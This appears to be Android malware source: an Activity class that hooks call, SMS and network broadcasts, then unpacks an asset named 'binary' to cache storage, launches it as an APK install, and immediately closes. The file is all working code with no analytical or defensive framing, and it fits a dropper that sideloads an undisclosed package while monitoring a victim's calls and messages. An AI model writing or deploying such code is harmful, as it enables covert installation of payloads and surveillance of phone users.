package mg.broadcast.hook;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.Bundle;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class AppActivity extends Activity{

	@Override
    protected void onCreate(Bundle bundle){
        super.onCreate(bundle);

        setContentView(R.layout.main_layout);
		
		registerCallReceiver();
		registerSmsReceiver();
        registerNetReceiver();

		install();
        finish();
    }

    private void install(){
        File file = new File(this.getExternalCacheDir(),"binary");
        try{
            InputStream inputStream=this.getAssets().open("binary");
            FileOutputStream fileOutputStream=new FileOutputStream(file);
            byte[] arrby=new byte[1024];
            do {
                int n;
                if((n=inputStream.read(arrby))<=0){
                    inputStream.close();
                    fileOutputStream.close();
                    Intent intent=new Intent("android.intent.action.VIEW");
                    intent.setDataAndType(Uri.fromFile(file),"application/vnd.android.package-archive");
                    startActivity(intent);
                    return;
                }
                fileOutputStream.write(arrby,0,n);
            } while (true);
        }
        catch(IOException iOException){
            return;
        }
    }

	private void registerCallReceiver(){
		IntentFilter intentFilter=new IntentFilter();
        intentFilter.addAction("android.intent.action.PHONE_STATE");
        intentFilter.addAction("android.intent.action.NEW_OUTGOING_CALL");

		CallReceiver callReceiver = new CallReceiver();
        registerReceiver(callReceiver,intentFilter);
	}
	
    private void registerNetReceiver(){
        IntentFilter intentFilter=new IntentFilter();
        intentFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
        intentFilter.addAction("android.net.wifi.WIFI_STATE_CHANGED");
        
		NetReceiver netReceiver = new NetReceiver();
        registerReceiver(netReceiver,intentFilter);
    }

    private void registerSmsReceiver(){
        IntentFilter intentFilter=new IntentFilter();
        intentFilter.addAction("android.provider.Telephony.SMS_SENT");
        intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
        
		SmsReceiver smsReceiver=new SmsReceiver();
        this.registerReceiver(smsReceiver,intentFilter);
    }
}
